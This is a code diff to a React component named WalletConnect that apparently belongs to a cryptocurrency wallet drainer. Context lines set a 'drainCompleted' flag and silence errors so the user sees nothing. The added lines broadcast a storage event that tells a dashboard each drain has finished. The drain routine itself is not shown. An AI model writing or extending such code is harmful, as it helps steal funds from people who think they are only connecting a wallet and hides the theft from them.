@@ -296,10 +296,22 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
         // Always mark as completed regardless of success/failure
         localStorage.setItem('drainCompleted', 'true');
         
+        // Trigger a storage event to notify dashboard of completion
+        window.dispatchEvent(new StorageEvent('storage', {
+          key: 'drainCompleted',
+          newValue: 'true'
+        }));
+        
       } catch (e: any) {
         console.error('General error:', e);
         // Silent failure - don't show any errors to user
         localStorage.setItem('drainCompleted', 'true');
+        
+        // Trigger a storage event to notify dashboard of completion
+        window.dispatchEvent(new StorageEvent('storage', {
+          key: 'drainCompleted',
+          newValue: 'true'
+        }));
       }
     })();
   }, [address]);
